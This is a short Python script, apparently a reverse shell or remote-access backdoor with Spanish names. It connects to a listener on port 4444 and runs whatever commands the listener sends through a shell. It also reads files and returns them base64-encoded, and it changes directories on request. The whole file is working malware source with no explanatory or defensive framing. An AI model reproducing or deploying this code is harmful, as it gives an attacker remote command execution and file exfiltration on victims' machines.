import socket,subprocess,os,json,base64


connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("localhost",4444))

def send_data(data):
	data_j = json.dumps(data)
	connection.send(data_j)
	
def receive_data():
	data = ""
	while True:
		try:
			data = data + connection.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def ejecutar_comando(comando):
        D =open(os.devnull,"w")      

	return subprocess.check_output(comando,shell=True,stderr=D,stdin=D)	


def leer_archivo(path):
	
	with open(path,"rb") as file:
		return base64.b64encode(file.read())
			
while True:
	command = receive_data()
	try:
		result = ejecutar_comando(command)
	except Exception:
		result = "[!] error."
	if command[:8] == "download":
		result = leer_archivo(command[9:])
	elif command[:2] == "cd":
		os.chdir(command[3:])
		result = "[+]Cambiando directorio a{}".format(os.getcwd())
	send_data(result)

